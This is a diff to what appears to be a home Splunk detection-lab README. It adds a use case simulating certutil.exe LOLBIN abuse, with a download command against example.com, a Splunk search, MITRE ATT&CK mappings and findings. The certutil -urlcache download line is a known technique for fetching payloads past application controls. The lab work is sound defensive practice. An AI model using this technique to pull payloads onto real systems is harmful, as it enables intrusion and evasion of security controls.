@@ -222,7 +222,47 @@ Encoded PowerShell execution activity was successfully identified within Splunk.
 
 ### Objective
 
- Detect abuse of trusted Windows binaries used to evade security controls.
+Detect abuse of trusted Windows binaries used to evade security controls and blend malicious activity into legitimate system operations.
+
+### Attack Simulation
+
+The native Windows utility `certutil.exe` was executed to simulate Living-Off-the-Land Binary (LOLBIN) abuse. certutil.exe is a legitimate Microsoft utility used to manage certificates.
+
+Attackers frequently abuse it to:
+
+Download payloads
+Transfer files
+Encode/decode malware
+Bypass application controls
+
+Because it's a trusted Microsoft binary, it often appears legitimate.
+
+```cmd
+certutil.exe -urlcache -split -f https://example.com test.txt
+
+<img width="1370" height="656" alt="image" src="https://github.com/user-attachments/assets/62000ab2-5c2e-4d61-99b0-3e04641d4a0d" />
+
+```
+
+### Splunk Investigation
+
+```spl
+index=main "certutil"
+```
+
+<img width="1761" height="685" alt="image" src="https://github.com/user-attachments/assets/2852c929-d55e-4fb1-b5de-fb67117f3be3" />
+
+
+### MITRE ATT&CK
+
+- T1218 - System Binary Proxy Execution
+- T1105 - Ingress Tool Transfer
+
+
+### Findings
+
+Execution of `certutil.exe` was successfully identified within Splunk. Command-line arguments and execution context were available for investigation, demonstrating visibility into LOLBIN abuse techniques frequently used by adversaries.
+
 
 ### MITRE ATT&CK
 
@@ -234,6 +274,8 @@ Encoded PowerShell execution activity was successfully identified within Splunk.
 ### Objective 
 
 Detect attempts to enumerate or access stored credentials.
+
+
 
 ### Use Case 8: Account & System Discovery
 
